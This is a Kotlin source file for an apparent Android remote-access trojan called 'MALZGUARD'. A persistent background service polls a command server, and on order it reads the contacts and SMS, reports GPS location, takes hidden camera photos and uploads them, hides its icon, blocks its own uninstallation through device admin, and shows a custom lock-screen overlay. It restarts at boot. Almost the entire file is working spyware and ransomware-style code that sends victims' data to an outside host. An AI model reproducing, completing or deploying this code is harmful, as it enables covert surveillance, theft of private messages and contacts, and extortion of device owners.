package com.example.malzguard

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.provider.Settings
import android.net.Uri
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class Svc : Service() {
    private var running = false
    private var id = ""
    private val server = Config.SERVER
    private var wakeLock: PowerManager.WakeLock? = null
    private var camThread: HandlerThread? = null
    private var camHandler: Handler? = null

    override fun onCreate() {
        super.onCreate()
        try {
            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            id = sp.getString("id", null) ?: run { val v = UUID.randomUUID().toString(); sp.edit().putString("id", v).apply(); v }
            if (Build.VERSION.SDK_INT >= 26) {
                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                nm.createNotificationChannel(NotificationChannel("mg", "MALZGUARD", NotificationManager.IMPORTANCE_MIN))
            }
            val n = Notification.Builder(this, "mg").setContentTitle("MALZGUARD").setContentText("Service running").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
            startForeground(1, n)
            try { val pm = getSystemService(POWER_SERVICE) as PowerManager; wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MALZGUARD::wl"); wakeLock?.acquire(10 * 60 * 1000L) } catch (e: Exception) {}
            camThread = HandlerThread("cam").also { it.start() }
            camHandler = Handler(camThread!!.looper)
        } catch (e: Exception) {}
        running = true
        Thread { loop() }.start()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY

    private fun loop() {
        while (running) {
            try {
                heartbeat()
                val body = httpGet("$server/api/poll/$id")
                if (body != null && body.contains("commands")) handle(body)
            } catch (e: Exception) {}
            try { Thread.sleep(3000) } catch (e: Exception) {}
        }
    }

    private fun httpGet(url: String): String? {
        try {
            val c = URL(url).openConnection() as HttpURLConnection
            c.connectTimeout = 10000; c.readTimeout = 15000; c.requestMethod = "GET"
            val code = c.responseCode
            val s = if (code in 200..299) c.inputStream else c.errorStream
            val text = s?.bufferedReader()?.use { it.readText() }; c.disconnect(); return text
        } catch (e: Exception) { return null }
    }

    private fun httpPost(url: String, body: String): String? {
        try {
            val c = URL(url).openConnection() as HttpURLConnection
            c.connectTimeout = 10000; c.readTimeout = 15000; c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "application/json")
            c.outputStream.use { it.write(body.toByteArray()) }
            val code = c.responseCode
            val s = if (code in 200..299) c.inputStream else c.errorStream
            val text = s?.bufferedReader()?.use { it.readText() }; c.disconnect(); return text
        } catch (e: Exception) { return null }
    }

    private fun httpUpload(path: String, bytes: ByteArray, name: String): String? {
        try {
            val boundary = "----MG" + System.currentTimeMillis()
            val c = URL(path).openConnection() as HttpURLConnection
            c.connectTimeout = 15000; c.readTimeout = 30000; c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val os = c.outputStream
            os.write(("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"$name\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray())
            os.write(bytes)
            os.write(("\r\n--$boundary--\r\n").toByteArray())
            os.flush()
            val code = c.responseCode
            val s = if (code in 200..299) c.inputStream else c.errorStream
            val text = s?.bufferedReader()?.use { it.readText() }; c.disconnect(); return text
        } catch (e: Exception) { return null }
    }

    private fun heartbeat() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val admin = ComponentName(this, AdminRecv::class.java)
            val isAdmin = try { dpm?.isAdminActive(admin) ?: false } catch (e: Exception) { false }
            val bm = getSystemService(BATTERY_SERVICE) as? BatteryManager
            val bat = try { bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1 } catch (e: Exception) { -1 }
            val j = JSONObject().put("id", id).put("model", Build.MANUFACTURER + " " + Build.MODEL).put("android", Build.VERSION.RELEASE).put("admin", if (isAdmin) 1 else 0).put("battery", bat)
            httpPost("$server/api/register", j.toString())
        } catch (e: Exception) {}
    }

    private fun handle(body: String) {
        try {
            val arr = JSONObject(body).getJSONArray("commands")
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val cid = o.getInt("id")
                val cmd = o.getString("cmd")
                val args = JSONObject(o.optString("args", "{}"))
                Thread {
                    val r = try { exec(cmd, args) } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
                    try { httpPost("$server/api/result/$cid", r) } catch (e: Exception) {}
                }.start()
            }
        } catch (e: Exception) {}
    }

    private fun exec(cmd: String, a: JSONObject): String {
        return try {
            when (cmd) {
                "lock" -> {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(this, AdminRecv::class.java)
                    if (!dpm.isAdminActive(admin)) "ERR: not admin" else { dpm.lockNow(); "locked" }
                }
                "custom_lock" -> {
                    val html = a.optString("html", LockOverlay.DEFAULT_HTML)
                    val i = Intent(this, LockOverlay::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    i.putExtra("html", html)
                    startActivity(i)
                    "custom lock shown"
                }
                "unlock" -> {
                    val i = Intent(this, LockOverlay::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    startActivity(i)
                    "unlock sent"
                }
                "vibrate" -> {
                    val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                    val ms = a.optLong("ms", 1000)
                    if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE)) else @Suppress("DEPRECATION") v.vibrate(ms)
                    "ok"
                }
                "toast" -> { val t = a.optString("text", "hi"); Handler(Looper.getMainLooper()).post { Toast.makeText(applicationContext, t, Toast.LENGTH_LONG).show() }; "ok" }
                "open_url" -> { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(a.optString("url", "https://google.com"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); "ok" }
                "get_location" -> {
                    val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                    val l = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                    if (l == null) "ERR: no location" else JSONObject().put("lat", l.latitude).put("lon", l.longitude).toString()
                }
                "get_contacts" -> {
                    val arr = JSONArray()
                    val c = contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                    c?.use { while (it.moveToNext() && arr.length() < 500) { arr.put(JSONObject().put("name", it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).put("phone", it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))) } }
                    arr.toString()
                }
                "get_sms" -> {
                    val arr = JSONArray()
                    val c = contentResolver.query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, android.provider.Telephony.Sms.DATE + " DESC")
                    c?.use { while (it.moveToNext() && arr.length() < 200) { arr.put(JSONObject().put("from", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS))).put("body", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY)))) } }
                    arr.toString()
                }
                "hide_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); "hidden" }
                "show_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); "shown" }
                "uninstall_block" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin" }
                "uninstall_unblock" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin" }
                "take_photo" -> { takePhoto(a.optString("facing", "back")); "photo requested" }
                else -> "unknown"
            }
        } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
    }

    private fun takePhoto(facing: String) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { cid ->
                val ch = cm.getCameraCharacteristics(cid)
                val f = ch.get(CameraCharacteristics.LENS_FACING)
                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
            } ?: cm.cameraIdList.firstOrNull() ?: return
            val ch = cm.getCameraCharacteristics(camId)
            val sz = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull() ?: return
            val reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
            val handler = camHandler ?: Handler(Looper.getMainLooper())
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage()
                    val buf = img?.planes?.get(0)?.buffer
                    if (buf != null) {
                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                        httpUpload("$server/api/upload/$id/photo", bytes, "cam_${System.currentTimeMillis()}.jpg")
                    }
                    img?.close()
                    r.close()
                } catch (e: Exception) {}
            }, handler)
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    try {
                        cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    req.addTarget(reader.surface)
                                    s.capture(req.build(), null, handler)
                                    handler.postDelayed({ try { cam.close() } catch (e: Exception) {} }, 3000)
                                } catch (e: Exception) { try { cam.close() } catch (e2: Exception) {} }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { try { cam.close() } catch (e: Exception) {} }
                        }, handler)
                    } catch (e: Exception) { try { cam.close() } catch (e2: Exception) {} }
                }
                override fun onDisconnected(cam: CameraDevice) { try { cam.close() } catch (e: Exception) {} }
                override fun onError(cam: CameraDevice, e: Int) { try { cam.close() } catch (e: Exception) {} }
            }, handler)
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        running = false
        try { wakeLock?.release() } catch (e: Exception) {}
        try { camThread?.quitSafely() } catch (e: Exception) {}
        super.onDestroy()
    }
    override fun onBind(i: Intent?): IBinder? = null
}

class AdminRecv : android.app.admin.DeviceAdminReceiver()

class Boot : android.content.BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent?) { try { c.startForegroundService(Intent(c, Svc::class.java)) } catch (e: Exception) {} }
}
